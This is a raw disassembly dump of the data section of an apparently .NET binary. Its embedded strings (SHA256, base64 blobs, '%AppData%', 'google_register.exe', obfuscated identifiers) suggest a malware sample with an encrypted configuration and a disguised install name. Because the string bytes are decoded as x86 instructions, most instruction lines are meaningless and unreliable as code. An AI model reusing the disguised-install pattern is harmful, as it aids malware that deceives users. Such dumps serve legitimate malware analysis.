  409e3a:	62 41 68             	bound  %eax,0x68(%ecx)
  409e3d:	66 79 00             	data16 jns 0x409e40
  409e40:	53                   	push   %ebx
  409e41:	79 73                	jns    0x409eb6
  409e43:	74 65                	je     0x409eaa
  409e45:	6d                   	insl   (%dx),%es:(%edi)
  409e46:	2e 53                	cs push %ebx
  409e48:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409e4c:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  409e53:	70 
  409e54:	74 6f                	je     0x409ec5
  409e56:	67 72 61             	addr16 jb 0x409eba
  409e59:	70 68                	jo     0x409ec3
  409e5b:	79 00                	jns    0x409e5d
  409e5d:	54                   	push   %esp
  409e5e:	59                   	pop    %ecx
  409e5f:	78 49                	js     0x409eaa
  409e61:	50                   	push   %eax
  409e62:	6f                   	outsl  %ds:(%esi),(%dx)
  409e63:	5a                   	pop    %edx
  409e64:	70 6e                	jo     0x409ed4
  409e66:	64 49                	fs dec %ecx
  409e68:	64 6b 79 00 41       	imul   $0x41,%fs:0x0(%ecx),%edi
  409e6d:	73 73                	jae    0x409ee2
  409e6f:	65 6d                	gs insl (%dx),%es:(%edi)
  409e71:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  409e75:	41                   	inc    %ecx
  409e76:	64 64 72 65          	fs fs jb 0x409edf
  409e7a:	73 73                	jae    0x409eef
  409e7c:	46                   	inc    %esi
  409e7d:	61                   	popa
  409e7e:	6d                   	insl   (%dx),%es:(%edi)
  409e7f:	69 6c 79 00 42 6c 6f 	imul   $0x636f6c42,0x0(%ecx,%edi,2),%ebp
  409e86:	63 
  409e87:	6b 43 6f 70          	imul   $0x70,0x6f(%ebx),%eax
  409e8b:	79 00                	jns    0x409e8d
  409e8d:	54                   	push   %esp
  409e8e:	6f                   	outsl  %ds:(%esi),(%dx)
  409e8f:	42                   	inc    %edx
  409e90:	69 6e 61 72 79 00 67 	imul   $0x67007972,0x61(%esi),%ebp
  409e97:	65 74 5f             	gs je  0x409ef9
  409e9a:	53                   	push   %ebx
  409e9b:	79 73                	jns    0x409f10
  409e9d:	74 65                	je     0x409f04
  409e9f:	6d                   	insl   (%dx),%es:(%edi)
  409ea0:	44                   	inc    %esp
  409ea1:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  409ea8:	79 00                	jns    0x409eaa
  409eaa:	52                   	push   %edx
  409eab:	65 67 69 73 74 72 79 	imul   $0x6f007972,%gs:0x74(%bp,%di),%esi
  409eb2:	00 6f 
  409eb4:	70 5f                	jo     0x409f15
  409eb6:	45                   	inc    %ebp
  409eb7:	71 75                	jno    0x409f2e
  409eb9:	61                   	popa
  409eba:	6c                   	insb   (%dx),%es:(%edi)
  409ebb:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  409ec2:	49 
  409ec3:	6e                   	outsb  %ds:(%esi),(%dx)
  409ec4:	65 71 75             	gs jno 0x409f3c
  409ec7:	61                   	popa
  409ec8:	6c                   	insb   (%dx),%es:(%edi)
  409ec9:	69 74 79 00 53 79 73 	imul   $0x74737953,0x0(%ecx,%edi,2),%esi
  409ed0:	74 
  409ed1:	65 6d                	gs insl (%dx),%es:(%edi)
  409ed3:	2e 4e                	cs dec %esi
  409ed5:	65 74 2e             	gs je  0x409f06
  409ed8:	53                   	push   %ebx
  409ed9:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409edd:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  409ee4:	64 
  409ee5:	6f                   	outsl  %ds:(%esi),(%dx)
  409ee6:	77 73                	ja     0x409f5b
  409ee8:	49                   	dec    %ecx
  409ee9:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  409eec:	74 69                	je     0x409f57
  409eee:	74 79                	je     0x409f69
  409ef0:	00 49 73             	add    %cl,0x73(%ecx)
  409ef3:	4e                   	dec    %esi
  409ef4:	75 6c                	jne    0x409f62
  409ef6:	6c                   	insb   (%dx),%es:(%edi)
  409ef7:	4f                   	dec    %edi
  409ef8:	72 45                	jb     0x409f3f
  409efa:	6d                   	insl   (%dx),%es:(%edi)
  409efb:	70 74                	jo     0x409f71
  409efd:	79 00                	jns    0x409eff
  409eff:	52                   	push   %edx
  409f00:	42                   	inc    %edx
  409f01:	48                   	dec    %eax
  409f02:	69 50 58 41 56 78 79 	imul   $0x79785641,0x58(%eax),%edx
  409f09:	00 65 56             	add    %ah,0x56(%ebp)
  409f0c:	67 62 64 6d          	bound  %esp,0x6d(%si)
  409f10:	4b                   	dec    %ebx
  409f11:	75 6d                	jne    0x409f80
  409f13:	54                   	push   %esp
  409f14:	53                   	push   %ebx
  409f15:	79 79                	jns    0x409f90
  409f17:	00 52 4c             	add    %dl,0x4c(%edx)
  409f1a:	52                   	push   %edx
  409f1b:	64 4c                	fs dec %esp
  409f1d:	56                   	push   %esi
  409f1e:	47                   	inc    %edi
  409f1f:	6c                   	insb   (%dx),%es:(%edi)
  409f20:	45                   	inc    %ebp
  409f21:	7a 00                	jp     0x409f23
  409f23:	57                   	push   %edi
  409f24:	45                   	inc    %ebp
  409f25:	69 43 4f 52 62 6f 45 	imul   $0x456f6252,0x4f(%ebx),%eax
  409f2c:	62 46 7a             	bound  %eax,0x7a(%esi)
  409f2f:	00 6a 44             	add    %ch,0x44(%edx)
  409f32:	71 6e                	jno    0x409fa2
  409f34:	67 76 7a             	addr16 jbe 0x409fb1
  409f37:	62 70 55             	bound  %esi,0x55(%eax)
  409f3a:	4e                   	dec    %esi
  409f3b:	7a 00                	jp     0x409f3d
  409f3d:	00 00                	add    %al,(%eax)
  409f3f:	00 00                	add    %al,(%eax)
  409f41:	0d 53 00 48 00       	or     $0x480053,%eax
  409f46:	41                   	inc    %ecx
  409f47:	00 32                	add    %dh,(%edx)
  409f49:	00 35 00 36 00 00    	add    %dh,0x3600
  409f4f:	81 59 30 00 74 00 55 	sbbl   $0x55007400,0x30(%ecx)
  409f56:	00 48 00             	add    %cl,0x0(%eax)
  409f59:	56                   	push   %esi
  409f5a:	00 71 00             	add    %dh,0x0(%ecx)
  409f5d:	32 00                	xor    (%eax),%al
  409f5f:	30 00                	xor    %al,(%eax)
  409f61:	38 00                	cmp    %al,(%eax)
  409f63:	30 00                	xor    %al,(%eax)
  409f65:	62 00                	bound  %eax,(%eax)
  409f67:	2f                   	das
  409f68:	00 64 00 6b          	add    %ah,0x6b(%eax,%eax,1)
  409f6c:	00 4b 00             	add    %cl,0x0(%ebx)
  409f6f:	36 00 31             	add    %dh,%ss:(%ecx)
  409f72:	00 52 00             	add    %dl,0x0(%edx)
  409f75:	61                   	popa
  409f76:	00 72 00             	add    %dh,0x0(%edx)
  409f79:	4b                   	dec    %ebx
  409f7a:	00 41 00             	add    %al,0x0(%ecx)
  409f7d:	57                   	push   %edi
  409f7e:	00 32                	add    %dh,(%edx)
  409f80:	00 70 00             	add    %dh,0x0(%eax)
  409f83:	64 00 2b             	add    %ch,%fs:(%ebx)
  409f86:	00 34 00             	add    %dh,(%eax,%eax,1)
  409f89:	38 00                	cmp    %al,(%eax)
  409f8b:	30 00                	xor    %al,(%eax)
  409f8d:	32 00                	xor    (%eax),%al
  409f8f:	53                   	push   %ebx
  409f90:	00 6d 00             	add    %ch,0x0(%ebp)
  409f93:	4b                   	dec    %ebx
  409f94:	00 6a 00             	add    %ch,0x0(%edx)
  409f97:	47                   	inc    %edi
  409f98:	00 44 00 4c          	add    %al,0x4c(%eax,%eax,1)
  409f9c:	00 4b 00             	add    %cl,0x0(%ebx)
  409f9f:	4d                   	dec    %ebp
  409fa0:	00 57 00             	add    %dl,0x0(%edi)
  409fa3:	59                   	pop    %ecx
  409fa4:	00 6b 00             	add    %ch,0x0(%ebx)
  409fa7:	45                   	inc    %ebp
  409fa8:	00 4a 00             	add    %cl,0x0(%edx)
  409fab:	34 00                	xor    $0x0,%al
  409fad:	49                   	dec    %ecx
  409fae:	00 51 00             	add    %dl,0x0(%ecx)
  409fb1:	44                   	inc    %esp
  409fb2:	00 50 00             	add    %dl,0x0(%eax)
  409fb5:	36 00 6f 00          	add    %ch,%ss:0x0(%edi)
  409fb9:	4e                   	dec    %esi
  409fba:	00 73 00             	add    %dh,0x0(%ebx)
  409fbd:	44                   	inc    %esp
  409fbe:	00 48 00             	add    %cl,0x0(%eax)
  409fc1:	69 00 4e 00 50 00    	imul   $0x50004e,(%eax),%eax
  409fc7:	78 00                	js     0x409fc9
  409fc9:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
  409fcd:	5a                   	pop    %edx
  409fce:	00 4d 00             	add    %cl,0x0(%ebp)
  409fd1:	4c                   	dec    %esp
  409fd2:	00 2b                	add    %ch,(%ebx)
  409fd4:	00 7a 00             	add    %bh,0x0(%edx)
  409fd7:	53                   	push   %ebx
  409fd8:	00 32                	add    %dh,(%edx)
  409fda:	00 55 00             	add    %dl,0x0(%ebp)
  409fdd:	56                   	push   %esi
  409fde:	00 39                	add    %bh,(%ecx)
  409fe0:	00 42 00             	add    %al,0x0(%edx)
  409fe3:	2f                   	das
  409fe4:	00 64 00 37          	add    %ah,0x37(%eax,%eax,1)
  409fe8:	00 34 00             	add    %dh,(%eax,%eax,1)
  409feb:	59                   	pop    %ecx
  409fec:	00 70 00             	add    %dh,0x0(%eax)
  409fef:	63 00                	arpl   %eax,(%eax)
  409ff1:	6e                   	outsb  %ds:(%esi),(%dx)
  409ff2:	00 57 00             	add    %dl,0x0(%edi)
  409ff5:	50                   	push   %eax
  409ff6:	00 4c 00 4d          	add    %cl,0x4d(%eax,%eax,1)
  409ffa:	00 57 00             	add    %dl,0x0(%edi)
  409ffd:	2f                   	das
  409ffe:	00 4d 00             	add    %cl,0x0(%ebp)
  40a001:	4c                   	dec    %esp
  40a002:	00 4e 00             	add    %cl,0x0(%esi)
  40a005:	73 00                	jae    0x40a007
  40a007:	33 00                	xor    (%eax),%eax
  40a009:	31 00                	xor    %eax,(%eax)
  40a00b:	39 00                	cmp    %eax,(%eax)
  40a00d:	74 00                	je     0x40a00f
  40a00f:	44                   	inc    %esp
  40a010:	00 53 00             	add    %dl,0x0(%ebx)
  40a013:	33 00                	xor    (%eax),%eax
  40a015:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40a019:	49                   	dec    %ecx
  40a01a:	00 79 00             	add    %bh,0x0(%ecx)
  40a01d:	72 00                	jb     0x40a01f
  40a01f:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  40a023:	37                   	aaa
  40a024:	00 45 00             	add    %al,0x0(%ebp)
  40a027:	66 00 50 00          	data16 add %dl,0x0(%eax)
  40a02b:	77 00                	ja     0x40a02d
  40a02d:	57                   	push   %edi
  40a02e:	00 49 00             	add    %cl,0x0(%ecx)
  40a031:	42                   	inc    %edx
  40a032:	00 66 00             	add    %ah,0x0(%esi)
  40a035:	48                   	dec    %eax
  40a036:	00 68 00             	add    %ch,0x0(%eax)
  40a039:	31 00                	xor    %eax,(%eax)
  40a03b:	62 00                	bound  %eax,(%eax)
  40a03d:	32 00                	xor    (%eax),%al
  40a03f:	41                   	inc    %ecx
  40a040:	00 74 00 30          	add    %dh,0x30(%eax,%eax,1)
  40a044:	00 44 00 44          	add    %al,0x44(%eax,%eax,1)
  40a048:	00 48 00             	add    %cl,0x0(%eax)
  40a04b:	64 00 44 00 2f       	add    %al,%fs:0x2f(%eax,%eax,1)
  40a050:	00 41 00             	add    %al,0x0(%ecx)
  40a053:	57                   	push   %edi
  40a054:	00 51 00             	add    %dl,0x0(%ecx)
  40a057:	55                   	push   %ebp
  40a058:	00 2b                	add    %ch,(%ebx)
  40a05a:	00 66 00             	add    %ah,0x0(%esi)
  40a05d:	55                   	push   %ebp
  40a05e:	00 56 00             	add    %dl,0x0(%esi)
  40a061:	72 00                	jb     0x40a063
  40a063:	31 00                	xor    %eax,(%eax)
  40a065:	30 00                	xor    %al,(%eax)
  40a067:	49                   	dec    %ecx
  40a068:	00 4c 00 52          	add    %cl,0x52(%eax,%eax,1)
  40a06c:	00 50 00             	add    %dl,0x0(%eax)
  40a06f:	30 00                	xor    %al,(%eax)
  40a071:	46                   	inc    %esi
  40a072:	00 6f 00             	add    %ch,0x0(%edi)
  40a075:	72 00                	jb     0x40a077
  40a077:	6e                   	outsb  %ds:(%esi),(%dx)
  40a078:	00 4a 00             	add    %cl,0x0(%edx)
  40a07b:	79 00                	jns    0x40a07d
  40a07d:	68 00 6c 00 79       	push   $0x79006c00
  40a082:	00 4b 00             	add    %cl,0x0(%ebx)
  40a085:	57                   	push   %edi
  40a086:	00 36                	add    %dh,(%esi)
  40a088:	00 47 00             	add    %al,0x0(%edi)
  40a08b:	68 00 46 00 34       	push   $0x34004600
  40a090:	00 37                	add    %dh,(%edi)
  40a092:	00 69 00             	add    %ch,0x0(%ecx)
  40a095:	4f                   	dec    %edi
  40a096:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40a09a:	00 37                	add    %dh,(%edi)
  40a09c:	00 70 00             	add    %dh,0x0(%eax)
  40a09f:	6b 00 34             	imul   $0x34,(%eax),%eax
  40a0a2:	00 7a 00             	add    %bh,0x0(%edx)
  40a0a5:	59                   	pop    %ecx
  40a0a6:	00 3d 00 00 80 b1    	add    %bh,0xb1800000
  40a0ac:	50                   	push   %eax
  40a0ad:	00 45 00             	add    %al,0x0(%ebp)
  40a0b0:	79 00                	jns    0x40a0b2
  40a0b2:	54                   	push   %esp
  40a0b3:	00 78 00             	add    %bh,0x0(%eax)
  40a0b6:	56                   	push   %esi
  40a0b7:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
  40a0bb:	00 4a 00             	add    %cl,0x0(%edx)
  40a0be:	4d                   	dec    %ebp
  40a0bf:	00 66 00             	add    %ah,0x0(%esi)
  40a0c2:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a0c6:	72 00                	jb     0x40a0c8
  40a0c8:	32 00                	xor    (%eax),%al
  40a0ca:	53                   	push   %ebx
  40a0cb:	00 7a 00             	add    %bh,0x0(%edx)
  40a0ce:	78 00                	js     0x40a0d0
  40a0d0:	63 00                	arpl   %eax,(%eax)
  40a0d2:	61                   	popa
  40a0d3:	00 50 00             	add    %dl,0x0(%eax)
  40a0d6:	5a                   	pop    %edx
  40a0d7:	00 69 00             	add    %ch,0x0(%ecx)
  40a0da:	69 00 73 00 30 00    	imul   $0x300073,(%eax),%eax
  40a0e0:	67 00 53 00          	add    %dl,0x0(%bp,%di)
  40a0e4:	4a                   	dec    %edx
  40a0e5:	00 75 00             	add    %dh,0x0(%ebp)
  40a0e8:	32 00                	xor    (%eax),%al
  40a0ea:	6c                   	insb   (%dx),%es:(%edi)
  40a0eb:	00 50 00             	add    %dl,0x0(%eax)
  40a0ee:	59                   	pop    %ecx
  40a0ef:	00 64 00 33          	add    %ah,0x33(%eax,%eax,1)
  40a0f3:	00 2f                	add    %ch,(%edi)
  40a0f5:	00 59 00             	add    %bl,0x0(%ecx)
  40a0f8:	69 00 34 00 4a 00    	imul   $0x4a0034,(%eax),%eax
  40a0fe:	58                   	pop    %eax
  40a0ff:	00 52 00             	add    %dl,0x0(%edx)
  40a102:	31 00                	xor    %eax,(%eax)
  40a104:	32 00                	xor    (%eax),%al
  40a106:	55                   	push   %ebp
  40a107:	00 7a 00             	add    %bh,0x0(%edx)
  40a10a:	61                   	popa
  40a10b:	00 59 00             	add    %bl,0x0(%ecx)
  40a10e:	67 00 49 00          	add    %cl,0x0(%bx,%di)
  40a112:	2b 00                	sub    (%eax),%eax
  40a114:	41                   	inc    %ecx
  40a115:	00 66 00             	add    %ah,0x0(%esi)
  40a118:	46                   	inc    %esi
  40a119:	00 37                	add    %dh,(%edi)
  40a11b:	00 58 00             	add    %bl,0x0(%eax)
  40a11e:	79 00                	jns    0x40a120
  40a120:	77 00                	ja     0x40a122
  40a122:	41                   	inc    %ecx
  40a123:	00 64 00 56          	add    %ah,0x56(%eax,%eax,1)
  40a127:	00 4c 00 50          	add    %cl,0x50(%eax,%eax,1)
  40a12b:	00 6e 00             	add    %ch,0x0(%esi)
  40a12e:	69 00 46 00 66 00    	imul   $0x660046,(%eax),%eax
  40a134:	70 00                	jo     0x40a136
  40a136:	53                   	push   %ebx
  40a137:	00 61 00             	add    %ah,0x0(%ecx)
  40a13a:	5a                   	pop    %edx
  40a13b:	00 4d 00             	add    %cl,0x0(%ebp)
  40a13e:	59                   	pop    %ecx
  40a13f:	00 42 00             	add    %al,0x0(%edx)
  40a142:	61                   	popa
  40a143:	00 74 00 76          	add    %dh,0x76(%eax,%eax,1)
  40a147:	00 2f                	add    %ch,(%edi)
  40a149:	00 51 00             	add    %dl,0x0(%ecx)
  40a14c:	74 00                	je     0x40a14e
  40a14e:	77 00                	ja     0x40a150
  40a150:	35 00 57 00 43       	xor    $0x43005700,%eax
  40a155:	00 51 00             	add    %dl,0x0(%ecx)
  40a158:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40a15d:	80 b1 32 00 43 00 61 	xorb   $0x61,0x430032(%ecx)
  40a164:	00 31                	add    %dh,(%ecx)
  40a166:	00 47 00             	add    %al,0x0(%edi)
  40a169:	4d                   	dec    %ebp
  40a16a:	00 62 00             	add    %ah,0x0(%edx)
  40a16d:	63 00                	arpl   %eax,(%eax)
  40a16f:	71 00                	jno    0x40a171
  40a171:	38 00                	cmp    %al,(%eax)
  40a173:	6f                   	outsl  %ds:(%esi),(%dx)
  40a174:	00 44 00 4a          	add    %al,0x4a(%eax,%eax,1)
  40a178:	00 43 00             	add    %al,0x0(%ebx)
  40a17b:	62 00                	bound  %eax,(%eax)
  40a17d:	73 00                	jae    0x40a17f
  40a17f:	55                   	push   %ebp
  40a180:	00 63 00             	add    %ah,0x0(%ebx)
  40a183:	4a                   	dec    %edx
  40a184:	00 35 00 57 00 30    	add    %dh,0x30005700
  40a18a:	00 51 00             	add    %dl,0x0(%ecx)
  40a18d:	50                   	push   %eax
  40a18e:	00 43 00             	add    %al,0x0(%ebx)
  40a191:	6b 00 58             	imul   $0x58,(%eax),%eax
  40a194:	00 46 00             	add    %al,0x0(%esi)
  40a197:	77 00                	ja     0x40a199
  40a199:	32 00                	xor    (%eax),%al
  40a19b:	52                   	push   %edx
  40a19c:	00 65 00             	add    %ah,0x0(%ebp)
  40a19f:	46                   	inc    %esi
  40a1a0:	00 46 00             	add    %al,0x0(%esi)
  40a1a3:	47                   	inc    %edi
  40a1a4:	00 37                	add    %dh,(%edi)
  40a1a6:	00 73 00             	add    %dh,0x0(%ebx)
  40a1a9:	70 00                	jo     0x40a1ab
  40a1ab:	66 00 77 00          	data16 add %dh,0x0(%edi)
  40a1af:	6b 00 61             	imul   $0x61,(%eax),%eax
  40a1b2:	00 4d 00             	add    %cl,0x0(%ebp)
  40a1b5:	50                   	push   %eax
  40a1b6:	00 48 00             	add    %cl,0x0(%eax)
  40a1b9:	30 00                	xor    %al,(%eax)
  40a1bb:	69 00 66 00 7a 00    	imul   $0x7a0066,(%eax),%eax
  40a1c1:	55                   	push   %ebp
  40a1c2:	00 59 00             	add    %bl,0x0(%ecx)
  40a1c5:	73 00                	jae    0x40a1c7
  40a1c7:	71 00                	jno    0x40a1c9
  40a1c9:	78 00                	js     0x40a1cb
  40a1cb:	57                   	push   %edi
  40a1cc:	00 75 00             	add    %dh,0x0(%ebp)
  40a1cf:	4e                   	dec    %esi
  40a1d0:	00 56 00             	add    %dl,0x0(%esi)
  40a1d3:	6a 00                	push   $0x0
  40a1d5:	6a 00                	push   $0x0
  40a1d7:	6f                   	outsl  %ds:(%esi),(%dx)
  40a1d8:	00 69 00             	add    %ch,0x0(%ecx)
  40a1db:	5a                   	pop    %edx
  40a1dc:	00 30                	add    %dh,(%eax)
  40a1de:	00 4f 00             	add    %cl,0x0(%edi)
  40a1e1:	51                   	push   %ecx
  40a1e2:	00 36                	add    %dh,(%esi)
  40a1e4:	00 47 00             	add    %al,0x0(%edi)
  40a1e7:	55                   	push   %ebp
  40a1e8:	00 50 00             	add    %dl,0x0(%eax)
  40a1eb:	34 00                	xor    $0x0,%al
  40a1ed:	46                   	inc    %esi
  40a1ee:	00 70 00             	add    %dh,0x0(%eax)
  40a1f1:	48                   	dec    %eax
  40a1f2:	00 70 00             	add    %dh,0x0(%eax)
  40a1f5:	36 00 71 00          	add    %dh,%ss:0x0(%ecx)
  40a1f9:	52                   	push   %edx
  40a1fa:	00 38                	add    %bh,(%eax)
  40a1fc:	00 6a 00             	add    %ch,0x0(%edx)
  40a1ff:	2b 00                	sub    (%eax),%eax
  40a201:	5a                   	pop    %edx
  40a202:	00 46 00             	add    %al,0x0(%esi)
  40a205:	38 00                	cmp    %al,(%eax)
  40a207:	57                   	push   %edi
  40a208:	00 51 00             	add    %dl,0x0(%ecx)
  40a20b:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40a210:	80 b1 63 00 6c 00 5a 	xorb   $0x5a,0x6c0063(%ecx)
  40a217:	00 7a 00             	add    %bh,0x0(%edx)
  40a21a:	45                   	inc    %ebp
  40a21b:	00 74 00 33          	add    %dh,0x33(%eax,%eax,1)
  40a21f:	00 62 00             	add    %ah,0x0(%edx)
  40a222:	4d                   	dec    %ebp
  40a223:	00 35 00 6b 00 37    	add    %dh,0x37006b00
  40a229:	00 54 00 65          	add    %dl,0x65(%eax,%eax,1)
  40a22d:	00 75 00             	add    %dh,0x0(%ebp)
  40a230:	49                   	dec    %ecx
  40a231:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a234:	47                   	inc    %edi
  40a235:	00 36                	add    %dh,(%esi)
  40a237:	00 5a 00             	add    %bl,0x0(%edx)
  40a23a:	51                   	push   %ecx
  40a23b:	00 36                	add    %dh,(%esi)
  40a23d:	00 4f 00             	add    %cl,0x0(%edi)
  40a240:	66 00 35 00 34 00 55 	data16 add %dh,0x55003400
  40a247:	00 2b                	add    %ch,(%ebx)
  40a249:	00 76 00             	add    %dh,0x0(%esi)
  40a24c:	53                   	push   %ebx
  40a24d:	00 4f 00             	add    %cl,0x0(%edi)
  40a250:	4a                   	dec    %edx
  40a251:	00 6a 00             	add    %ch,0x0(%edx)
  40a254:	41                   	inc    %ecx
  40a255:	00 56 00             	add    %dl,0x0(%esi)
  40a258:	78 00                	js     0x40a25a
  40a25a:	44                   	inc    %esp
  40a25b:	00 49 00             	add    %cl,0x0(%ecx)
  40a25e:	53                   	push   %ebx
  40a25f:	00 49 00             	add    %cl,0x0(%ecx)
  40a262:	73 00                	jae    0x40a264
  40a264:	5a                   	pop    %edx
  40a265:	00 31                	add    %dh,(%ecx)
  40a267:	00 52 00             	add    %dl,0x0(%edx)
  40a26a:	45                   	inc    %ebp
  40a26b:	00 74 00 4a          	add    %dh,0x4a(%eax,%eax,1)
  40a26f:	00 4d 00             	add    %cl,0x0(%ebp)
  40a272:	69 00 4b 00 73 00    	imul   $0x73004b,(%eax),%eax
  40a278:	74 00                	je     0x40a27a
  40a27a:	4f                   	dec    %edi
  40a27b:	00 2f                	add    %ch,(%edi)
  40a27d:	00 53 00             	add    %dl,0x0(%ebx)
  40a280:	68 00 32 00 49       	push   $0x49003200
  40a285:	00 67 00             	add    %ah,0x0(%edi)
  40a288:	52                   	push   %edx
  40a289:	00 33                	add    %dh,(%ebx)
  40a28b:	00 4b 00             	add    %cl,0x0(%ebx)
  40a28e:	36 00 36             	add    %dh,%ss:(%esi)
  40a291:	00 30                	add    %dh,(%eax)
  40a293:	00 70 00             	add    %dh,0x0(%eax)
  40a296:	71 00                	jno    0x40a298
  40a298:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40a29c:	57                   	push   %edi
  40a29d:	00 35 00 35 00 50    	add    %dh,0x50003500
  40a2a3:	00 65 00             	add    %ah,0x0(%ebp)
  40a2a6:	33 00                	xor    (%eax),%eax
  40a2a8:	73 00                	jae    0x40a2aa
  40a2aa:	34 00                	xor    $0x0,%al
  40a2ac:	6f                   	outsl  %ds:(%esi),(%dx)
  40a2ad:	00 64 00 6b          	add    %ah,0x6b(%eax,%eax,1)
  40a2b1:	00 56 00             	add    %dl,0x0(%esi)
  40a2b4:	61                   	popa
  40a2b5:	00 33                	add    %dh,(%ebx)
  40a2b7:	00 47 00             	add    %al,0x0(%edi)
  40a2ba:	63 00                	arpl   %eax,(%eax)
  40a2bc:	67 00 3d             	add    %bh,(%di)
  40a2bf:	00 3d 00 00 13 25    	add    %bh,0x25130000
  40a2c5:	00 41 00             	add    %al,0x0(%ecx)
  40a2c8:	70 00                	jo     0x40a2ca
  40a2ca:	70 00                	jo     0x40a2cc
  40a2cc:	44                   	inc    %esp
  40a2cd:	00 61 00             	add    %ah,0x0(%ecx)
  40a2d0:	74 00                	je     0x40a2d2
  40a2d2:	61                   	popa
  40a2d3:	00 25 00 00 27 67    	add    %ah,0x67270000
  40a2d9:	00 6f 00             	add    %ch,0x0(%edi)
  40a2dc:	6f                   	outsl  %ds:(%esi),(%dx)
  40a2dd:	00 67 00             	add    %ah,0x0(%edi)
  40a2e0:	6c                   	insb   (%dx),%es:(%edi)
  40a2e1:	00 65 00             	add    %ah,0x0(%ebp)
  40a2e4:	5f                   	pop    %edi
  40a2e5:	00 72 00             	add    %dh,0x0(%edx)
  40a2e8:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  40a2ec:	69 00 73 00 74 00    	imul   $0x740073,(%eax),%eax
  40a2f2:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a2f6:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40a2fa:	78 00                	js     0x40a2fc
  40a2fc:	65 00 00             	add    %al,%gs:(%eax)
  40a2ff:	59                   	pop    %ecx
  40a300:	5a                   	pop    %edx
  40a301:	00 44 00 68          	add    %al,0x68(%eax,%eax,1)
  40a305:	00 68 00             	add    %ch,0x0(%eax)
  40a308:	4e                   	dec    %esi
  40a309:	00 54 00 64          	add    %dl,0x64(%eax,%eax,1)
  40a30d:	00 35 00 56 00 57    	add    %dh,0x57005600
  40a313:	00 68 00             	add    %ch,0x0(%eax)
  40a316:	59                   	pop    %ecx
  40a317:	00 61 00             	add    %ah,0x0(%ecx)
  40a31a:	47                   	inc    %edi
  40a31b:	00 73 00             	add    %dh,0x0(%ebx)
  40a31e:	79 00                	jns    0x40a320
  40a320:	5a                   	pop    %edx
  40a321:	00 58 00             	add    %bl,0x0(%eax)
  40a324:	5a                   	pop    %edx
  40a325:	00 33                	add    %dh,(%ebx)
  40a327:	00 64 00 30          	add    %ah,0x30(%eax,%eax,1)
  40a32b:	00 5a 00             	add    %bl,0x0(%edx)
  40a32e:	6d                   	insl   (%dx),%es:(%edi)
  40a32f:	00 59 00             	add    %bl,0x0(%ecx)
  40a332:	55                   	push   %ebp
  40a333:	00 4e 00             	add    %cl,0x0(%esi)
  40a336:	32 00                	xor    (%eax),%al
  40a338:	63 00                	arpl   %eax,(%eax)
  40a33a:	31 00                	xor    %eax,(%eax)
  40a33c:	4e                   	dec    %esi
  40a33d:	00 6a 00             	add    %ch,0x0(%edx)
  40a340:	51                   	push   %ecx
  40a341:	00 6c 00 6b          	add    %ch,0x6b(%eax,%eax,1)
  40a345:	00 33                	add    %dh,(%ebx)
  40a347:	00 4e 00             	add    %cl,0x0(%esi)
  40a34a:	31 00                	xor    %eax,(%eax)
  40a34c:	64 00 50 00          	add    %dl,%fs:0x0(%eax)
  40a350:	52                   	push   %edx
  40a351:	00 56 00             	add    %dl,0x0(%esi)
  40a354:	49                   	dec    %ecx
  40a355:	00 3d 00 00 80 b1    	add    %bh,0xb1800000
  40a35b:	68 00 6e 00 58       	push   $0x58006e00
  40a360:	00 52 00             	add    %dl,0x0(%edx)
  40a363:	33 00                	xor    (%eax),%eax
  40a365:	7a 00                	jp     0x40a367
  40a367:	62 00                	bound  %eax,(%eax)
  40a369:	4d                   	dec    %ebp
  40a36a:	00 67 00             	add    %ah,0x0(%edi)
  40a36d:	43                   	inc    %ebx
  40a36e:	00 4b 00             	add    %cl,0x0(%ebx)
  40a371:	5a                   	pop    %edx
  40a372:	00 75 00             	add    %dh,0x0(%ebp)
  40a375:	4f                   	dec    %edi
  40a376:	00 35 00 31 00 77    	add    %dh,0x77003100
  40a37c:	00 33                	add    %dh,(%ebx)
  40a37e:	00 68 00             	add    %ch,0x0(%eax)
  40a381:	47                   	inc    %edi
  40a382:	00 48 00             	add    %cl,0x0(%eax)
  40a385:	69 00 41 00 77 00    	imul   $0x770041,(%eax),%eax
  40a38b:	56                   	push   %esi
  40a38c:	00 65 00             	add    %ah,0x0(%ebp)
  40a38f:	4d                   	dec    %ebp
  40a390:	00 4b 00             	add    %cl,0x0(%ebx)
  40a393:	4e                   	dec    %esi
  40a394:	00 49 00             	add    %cl,0x0(%ecx)
  40a397:	57                   	push   %edi
  40a398:	00 4f 00             	add    %cl,0x0(%edi)
  40a39b:	35 00 4e 00 31       	xor    $0x31004e00,%eax
  40a3a0:	00 58 00             	add    %bl,0x0(%eax)
  40a3a3:	4f                   	dec    %edi
  40a3a4:	00 4e 00             	add    %cl,0x0(%esi)
  40a3a7:	78 00                	js     0x40a3a9
  40a3a9:	36 00 49 00          	add    %cl,%ss:0x0(%ecx)
  40a3ad:	62 00                	bound  %eax,(%eax)
  40a3af:	59                   	pop    %ecx
  40a3b0:	00 4c 00 35          	add    %cl,0x35(%eax,%eax,1)
  40a3b4:	00 59 00             	add    %bl,0x0(%ecx)
  40a3b7:	6b 00 69             	imul   $0x69,(%eax),%eax
  40a3ba:	00 2b                	add    %ch,(%ebx)
  40a3bc:	00 55 00             	add    %dl,0x0(%ebp)
  40a3bf:	33 00                	xor    (%eax),%eax
